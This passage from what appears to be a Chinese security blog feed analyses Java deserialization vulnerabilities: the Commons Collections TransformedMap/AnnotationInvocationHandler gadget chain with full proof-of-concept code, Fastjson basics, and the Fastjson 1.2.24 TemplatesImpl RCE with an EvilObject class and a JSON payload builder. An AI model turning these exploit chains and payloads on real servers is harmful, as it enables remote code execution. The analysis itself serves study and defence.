<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//以下省略部分代码</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TransformedMap</span></span></span><br><span class="line"><span class="class">        <span class="keyword">extends</span> <span class="title">AbstractInputCheckedMapDecorator</span></span></span><br><span class="line"><span class="class">        <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** Serialization version */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">7023152376788900464L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** The transformer to use for the key */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer keyTransformer;</span><br><span class="line">    <span class="comment">/** The transformer to use for the value */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">final</span> Transformer valueTransformer;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Map <span class="title">decorate</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="title">TransformedMap</span><span class="params">(Map map, Transformer keyTransformer, Transformer valueTransformer)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(map);</span><br><span class="line">        <span class="keyword">this</span>.keyTransformer = keyTransformer;</span><br><span class="line">        <span class="keyword">this</span>.valueTransformer = valueTransformer;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">transformValue</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (valueTransformer == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> object;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> valueTransformer.transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Map <span class="title">transformMap</span><span class="params">(Map map)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (map.isEmpty()) &#123;</span><br><span class="line">            <span class="keyword">return</span> map;</span><br><span class="line">        &#125;</span><br><span class="line">        Map result = <span class="keyword">new</span> LinkedMap(map.size());</span><br><span class="line">        <span class="keyword">for</span> (Iterator it = map.entrySet().iterator(); it.hasNext(); ) &#123;</span><br><span class="line">            Map.Entry entry = (Map.Entry) it.next();</span><br><span class="line">            result.put(transformKey(entry.getKey()), transformValue(entry.getValue()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">		<span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Override to transform the value when using &lt;code&gt;setValue&lt;/code&gt;.</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> value  the value to transform</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> the transformed value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@since</span> Commons Collections 3.1</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Object <span class="title">checkSetValue</span><span class="params">(Object value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> valueTransformer.transform(value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">put</span><span class="params">(Object key, Object value)</span> </span>&#123;</span><br><span class="line">        key = transformKey(key);</span><br><span class="line">        value = transformValue(value);</span><br><span class="line">        <span class="keyword">return</span> getMap().put(key, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>TransformedMap</code>执行<code>setValue/put/putAll</code>中的任意方法都会调用<code>transform</code>方法，从而也就会触发命令执行。我们只需要将之前构造好的恶意<code>ChainedTransformer</code>包装进<code>TransformedMap</code>并想办法触发<code>TransformedMap</code>的<code>setValue/put/putAll</code>方法即可</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">Map ouputMap = TransformedMap.decorate(innerMap,<span class="keyword">null</span>,chainedTransformer);</span><br></pre></td></tr></table></figure>

<h2 id="4、AnnotationInvocationHandlerMap类"><a href="#4、AnnotationInvocationHandlerMap类" class="headerlink" title="4、AnnotationInvocationHandlerMap类"></a>4、<strong>AnnotationInvocationHandlerMap类</strong></h2><p>在Java的低版本(jdk1.8较低的版本如 1.8u60,在较高的jdk版本该问题类已经被修复)代码中存在<code>AnnotationInvocationHandlerMap</code>类，其<code>readObject</code>方法如下所示</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">         <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">     s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">     <span class="comment">// Check to make sure that types have not evolved incompatibly</span></span><br><span class="line"></span><br><span class="line">     AnnotationType annotationType = <span class="keyword">null</span>;</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         annotationType = AnnotationType.getInstance(type);</span><br><span class="line">     &#125; <span class="keyword">catch</span> (IllegalArgumentException e) &#123;</span><br><span class="line">         <span class="comment">// Class is no longer an annotation type; time to punch out</span></span><br><span class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> java.io.InvalidObjectException(<span class="string">&quot;Non-annotation type in annotation serial stream&quot;</span>);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();</span><br><span class="line"></span><br><span class="line">     <span class="comment">// If there are annotation members without values, that</span></span><br><span class="line">     <span class="comment">// situation is handled by the invoke method.</span></span><br><span class="line">     <span class="keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;</span><br><span class="line">         String name = memberValue.getKey();</span><br><span class="line">         Class&lt;?&gt; memberType = memberTypes.get(name);</span><br><span class="line">         <span class="keyword">if</span> (memberType != <span class="keyword">null</span>) &#123;  <span class="comment">// i.e. member still exists</span></span><br><span class="line">             Object value = memberValue.getValue();</span><br><span class="line">             <span class="keyword">if</span> (!(memberType.isInstance(value) ||</span><br><span class="line">                     value <span class="keyword">instanceof</span> ExceptionProxy)) &#123;</span><br><span class="line">                 memberValue.setValue(</span><br><span class="line">                         <span class="keyword">new</span> AnnotationTypeMismatchExceptionProxy(</span><br><span class="line">                                 value.getClass() + <span class="string">&quot;[&quot;</span> + value + <span class="string">&quot;]&quot;</span>).setMember(</span><br><span class="line">                                 annotationType.members().get(name)));</span><br><span class="line">             &#125;</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p><code>AnnotationInvocationHandler</code>类实现了<code>InvocationHandler</code>(<code>Java动态代理</code>)接口和<code>java.io.Serializable</code>接口，它还重写了<code>readObject</code>方法，在<code>readObject</code>方法中还间接的调用了<code>TransformedMap</code>中<code>MapEntry</code>的<code>setValue</code>方法，触发<code>TransformedMap</code>中的<code>checkSetValue</code>方法，从而也就触发了<code>transform</code>方法，完成了整个攻击链的调用。</p>
<p>因为<code>sun.reflect.annotation.AnnotationInvocationHandler</code>是一个内部API专用的类，在外部我们无法通过类名创建出<code>AnnotationInvocationHandler</code>类实例，所以我们需要通过反射的方式创建出<code>AnnotationInvocationHandler</code>对象</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//jdk1.8高版本该类的方法readObject()是使用了native方法安全更新map，无法再触发</span></span><br><span class="line">Constructor&lt;?&gt; ctor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">InvocationHandler o = (InvocationHandler) ctor.newInstance(Target.class,ouputMap);</span><br></pre></td></tr></table></figure>

<p>我们只需要将这个<code>InvocationHandler</code>对象序列化后就可以得到用于攻击的<code>payload</code>了。</p>
<h2 id="5、总结"><a href="#5、总结" class="headerlink" title="5、总结"></a>5、总结</h2><p>总的来说如果在实际环境中想要查看是否存在反序列化漏洞可以从以下几个点切入进行分析</p>
<ol>
<li>判断是否存在反序列化点(即<code>readObject()</code>)</li>
<li>反序列化点的输入是否可控</li>
<li>是否用到了一些常见Gadget的包(在这个例子中就是<code>org.apache.commons.collections</code>)</li>
</ol>
<h2 id="6、完整代码"><a href="#6、完整代码" class="headerlink" title="6、完整代码"></a>6、<strong>完整代码</strong></h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializeMapForTransformer</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">( String[] args )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        Transformer transformer = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        <span class="comment">//利用AnnotationInvocationHandler反序列化，直接触发Transformer ---jdk1.8高版本已经更新无法再成功了</span></span><br><span class="line">        testAnnotationInvocationHandlerMap(transformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//测试TransformerMap在map的key、value改变中触发</span></span><br><span class="line">        <span class="comment">//testMap(transformer);</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 测试AnnotationInvocationHandler反序列化中，直接触发Transformer</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testAnnotationInvocationHandlerMap</span><span class="params">(Transformer transformer)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//转化map</span></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;1&quot;</span>);</span><br><span class="line">        Map ouputMap = TransformedMap.decorate(innerMap,<span class="keyword">null</span>,transformer);</span><br><span class="line">        <span class="comment">//jdk1.8该类的方法readObject()是使用了native方法安全更新map，无法再触发</span></span><br><span class="line">        Constructor&lt;?&gt; ctor = Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>).getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler o = (InvocationHandler) ctor.newInstance(Target.class,ouputMap);</span><br><span class="line">        <span class="comment">//序列化输出</span></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = serialize(o);</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        deserialize(bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 测试TransformerMap在包装的map中，key、value改变触发Transformer</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">testMap</span><span class="params">(Transformer transformer)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        <span class="comment">//转化map</span></span><br><span class="line">        Map ouputMap = TransformedMap.decorate(<span class="keyword">new</span> HashMap&lt;&gt;(),<span class="keyword">null</span>,transformer);</span><br><span class="line">        <span class="comment">//序列化输出</span></span><br><span class="line">        <span class="keyword">byte</span>[] bytes = serialize(ouputMap);</span><br><span class="line">        <span class="comment">//反序列化</span></span><br><span class="line">        Map innerMap = deserialize(bytes);</span><br><span class="line">        <span class="comment">//put操作触发，命令链</span></span><br><span class="line">        innerMap.put(<span class="string">&quot;1&quot;</span>,<span class="string">&quot;value&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(Object o) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(o);</span><br><span class="line">        <span class="keyword">byte</span>[] bytes = byteArrayOutputStream.toByteArray();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        <span class="keyword">return</span> bytes;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T&gt;<span class="function">T <span class="title">deserialize</span><span class="params">(<span class="keyword">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ByteArrayInputStream byteArrayInputStream = <span class="keyword">new</span> ByteArrayInputStream(bytes);</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(byteArrayInputStream);</span><br><span class="line">        T o = (T) objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">        <span class="keyword">return</span> o;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjson历史漏洞分析(一)--基础知识</title>
    <url>/2021/11/18/Fastjson(%E4%B8%80)-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%2022cba1e1a9d34336a70b7cf31c47616f/</url>
    <content><![CDATA[<blockquote>
<p><strong>本文主要分析Fastjson的历史反序列化漏洞，首先需要了解一些漏洞相关的知识</strong></p>
</blockquote>
<span id="more"></span>

<h2 id="1、简介"><a href="#1、简介" class="headerlink" title="1、简介"></a>1、简介</h2><p>Fastjson是Alibaba开发的Java语言编写的高性能JSON库，用于将数据在JSON和Java Object之间互相转换，提供两个主要接口<code>JSON.toJSONString</code>和<code>JSON.parseObject / JSON.parse</code>来分别实现序列化和反序列化操作。</p>
<h2 id="2、Fastjson漏洞相关特性"><a href="#2、Fastjson漏洞相关特性" class="headerlink" title="2、Fastjson漏洞相关特性"></a>2、Fastjson漏洞相关特性</h2><ul>
<li>当反序列化为<code>JSON.parseObject(*)</code>形式即未指定class时，会调用反序列化得到的类的构造函数、所有属性的getter方法、JSON里面的非私有属性的setter方法，其中properties属性的getter方法调用了两次；</li>
<li>当反序列化为<code>JSON.parseObject(*,*.class)</code>形式即指定class时，只调用反序列化得到的类的构造函数、JSON里面的非私有属性的setter方法、properties属性的getter方法；</li>
<li>当反序列化为<code>JSON.parseObject(*)</code>形式即未指定class进行反序列化时得到的都是JSONObject类对象，而只要指定了class即<code>JSON.parseObject(*,*.class)</code>形式得到的都是特定的Student类；</li>
</ul>
<p><strong>下面直接引用结论，Fastjson会对满足下列要求的setter/getter方法进行调用：</strong></p>
<p>满足条件的setter：</p>
<ul>
<li>函数名长度大于4且以set开头</li>
<li>非静态函数</li>
<li>返回类型为void或当前类</li>
<li>参数个数为1个</li>
</ul>
<p>满足条件的getter：</p>
<ul>
<li>函数名长度大于等于4</li>
<li>非静态方法</li>
<li>以get开头且第4个字母为大写</li>
<li>无参数</li>
<li>返回值类型继承自<code>Collection</code>或<code>Map</code>或<code>AtomicBoolean</code>或<code>AtomicInteger</code>或<code>AtomicLong</code></li>
</ul>
<p>注意，除了<code>getter</code>方法和<code>setter</code>方法外，还有个is方法这里没有列举，可自行测试。</p>
<p>前面的<code>properties</code>私有属性，其类型为<code>Properties</code>，而<code>Properties</code>是继承于<code>Hashtable</code>，<code>Hashtable</code>是实现<code>Map</code>接口类的类，因此<code>properties</code>私有属性的<code>getter</code>方法时继承自<code>Map</code>，从而能够成功被<code>Fastjson</code>调用。</p>
<h2 id="3、漏洞重点"><a href="#3、漏洞重点" class="headerlink" title="3、漏洞重点"></a>3、漏洞重点</h2><p>若反序列化指定类型的类如<code>Student obj = JSON.parseObject(text, Student.class);</code>，该类本身的构造函数、<code>setter</code>方法、<code>getter</code>方法存在危险操作，则存在`Fastjson反序列化漏洞；</p>
<p>若反序列化未指定类型的类如<code>Object obj = JSON.parseObject(text, Object.class);</code>，该若该类的子类的构造方法、<code>setter</code>方法、<code>getter</code>方法存在危险操作，则存在<code>Fastjson</code>反序列化漏洞；</p>
<h2 id="4、总结"><a href="#4、总结" class="headerlink" title="4、总结"></a>4、总结</h2><p>总的来说，因为<code>Fastjson</code>在反序列化的过程中会调用该类的构造方法，<code>setter</code>和<code>getter</code>方法，一旦其中存在危险操作则有可能存在反序列化漏洞</p>
<h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><hr>
<p><a href="https://www.mi1k7ea.com/2019/11/03/Fastjson%E7%B3%BB%E5%88%97%E4%B8%80%E2%80%94%E2%80%94%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%9F%BA%E6%9C%AC%E5%8E%9F%E7%90%86/#%E5%B0%8F%E7%BB%93">Fastjson系列一–反序列化漏洞基本原理</a></p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>Java安全</tag>
        <tag>反序列化</tag>
        <tag>fastjson</tag>
      </tags>
  </entry>
  <entry>
    <title>Fastjson历史漏洞分析(二)--1.2.22≤ Fastjson ≤1.2.24 RCE漏洞分析</title>
    <url>/2021/11/18/Fastjson(%E4%BA%8C)-1%202%2022%E2%89%A4%20Fastjson%20%E2%89%A41%202%2024%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%205021cb9b11734c978b39ecd4937acbc2/</url>
    <content><![CDATA[<blockquote>
<p><strong>本文用fastjson爆出的第一个漏洞进行原理分析</strong></p>
</blockquote>
<span id="more"></span>

<h2 id="1、背景"><a href="#1、背景" class="headerlink" title="1、背景"></a>1、背景</h2><p>fastjson是一个java编写的高性能功能非常完善的JSON库，应用范围非常广，在github上star数都超过8k，在2017年3月15日，fastjson官方主动爆出fastjson在1.2.24及之前版本存在远程代码执行高危安全漏洞。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。关于漏洞的具体详情可参考 <a href="https://github.com/alibaba/fastjson/wiki/security_update_20170315">https://github.com/alibaba/fastjson/wiki/security_update_20170315</a></p>
<h2 id="2、受影响版本"><a href="#2、受影响版本" class="headerlink" title="2、受影响版本"></a>2、受影响版本</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.2.22 &lt;= fastjson &lt;= 1.2.24</span><br></pre></td></tr></table></figure>

<h2 id="3、反序列化流程"><a href="#3、反序列化流程" class="headerlink" title="3、反序列化流程"></a>3、反序列化流程</h2><p>这里为了更好的理解整个漏洞的流程以及利用链在网上找了个demo进行调试一下</p>
<h3 id="3-1-测试代码"><a href="#3-1-测试代码" class="headerlink" title="3.1 测试代码"></a>3.1 测试代码</h3><p><strong>EvilObject</strong></p>
<p>这个是我们需要反序列化的恶意类，可以看到在实例化的时候会执行恶意代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EvilObject</span> <span class="keyword">extends</span> <span class="title">AbstractTranslet</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">EvilObject</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">transform</span><span class="params">(DOM document, com.sun.org.apache.xml.internal.serializer.SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        EvilObject evilObject = <span class="keyword">new</span> EvilObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>TemplatesImplPoc</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">TemplatesImplPoc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">readClass</span><span class="params">(String cls)</span></span>&#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            IOUtils.copy(<span class="keyword">new</span> FileInputStream(<span class="keyword">new</span> File(cls)), bos);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> Base64.encodeBase64String(bos.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 影响范围 1.2.22 &lt;= fastjson &lt;= 1.2.24</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="comment">//com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span>  <span class="title">templatesImplPoc</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ParserConfig config = <span class="keyword">new</span> ParserConfig();</span><br><span class="line">        <span class="keyword">final</span> String evilClassPath = System.getProperty(<span class="string">&quot;user.dir&quot;</span>) + <span class="string">&quot;/fastjson/target/classes/barcelona/littlet1gger/fastjson/EvilObject.class&quot;</span>;</span><br><span class="line">        String evilCode = readClass(evilClassPath);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//TemplatesImpl</span></span><br><span class="line">        <span class="keyword">final</span> String NASTY_CLASS = <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>;</span><br><span class="line">        String text1 = <span class="string">&quot;&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS + <span class="string">&quot;\&quot;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;LittleT1gger&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125; &quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">        System.out.println(text1);</span><br><span class="line"></span><br><span class="line">        Object obj = JSON.parseObject(text1, Object.class, config, Feature.SupportNonPublicField);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String args[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            templatesImplPoc();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里重点关注一下text1中的内容</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String text1 = <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;&quot;</span> + NASTY_CLASS +</span><br><span class="line">                <span class="string">&quot;\&quot;,\&quot;_bytecodes\&quot;:[\&quot;&quot;</span>+evilCode+<span class="string">&quot;\&quot;],&#x27;_name&#x27;:&#x27;a.b&#x27;,&#x27;_tfactory&#x27;:&#123; &#125;,\&quot;_outputProperties\&quot;:&#123; &#125;,&quot;</span> +</span><br><span class="line">                <span class="string">&quot;\&quot;_name\&quot;:\&quot;a\&quot;,\&quot;_version\&quot;:\&quot;1.0\&quot;,\&quot;allowedProtocols\&quot;:\&quot;all\&quot;&#125;\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>将<code>EvilObject</code> 编译后的.class作为<code>bytecodes</code>的值放进json中，<code>@type</code>指定了反序列的类为<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code> ,fastjson会根据指定类去反序列化得到该类的实例。在默认情况下，<code>fastjson</code>只会反序列化<code>public</code>属性，而<code>TemplatesImpl</code>中<code>_bytecodes</code>却是私有属性，<code>_name</code>也是私有属性，所以在<code>parseObject</code>的时候需要设置<code>Feature.SupportNonPublicField</code> (由于这个属性在<code>1.2.22</code> 才加入所以利用起来比较有局限性)，这样<code>_bytecodes</code>字段才会被反序列化。<code>_tfactory</code>这个字段在<code>TemplatesImpl</code>既没有<code>get</code>方法也没有<code>set</code>方法，通过设置<code>_tfactory</code>为<code>&#123; &#125;</code>,fastjson会调用其无参构造函数得<code>_tfactory</code>对象，这样就解决了某些版本中在<code>defineTransletClasses()</code>用到会引用<code>_tfactory</code>属性导致异常退出。</p>
<h3 id="3-2-TemplatesImpl利用链分析"><a href="#3-2-TemplatesImpl利用链分析" class="headerlink" title="3.2 TemplatesImpl利用链分析"></a>3.2 TemplatesImpl利用链分析</h3><p>我们先重点关注一下在反射创建<code>TemplatesImpl</code>的过程中发生了什么</p>
<p>将断点直接断在命令执行的那行，查看调用链</p>
<p><img src="/2021/11/18/Fastjson(%E4%BA%8C)-1%202%2022%E2%89%A4%20Fastjson%20%E2%89%A41%202%2024%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%205021cb9b11734c978b39ecd4937acbc2/Untitled.png" alt="Untitled"></p>
<p><img src="/2021/11/18/Fastjson(%E4%BA%8C)-1%202%2022%E2%89%A4%20Fastjson%20%E2%89%A41%202%2024%20RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%205021cb9b11734c978b39ecd4937acbc2/Untitled1.png" alt="Untitled"></p>
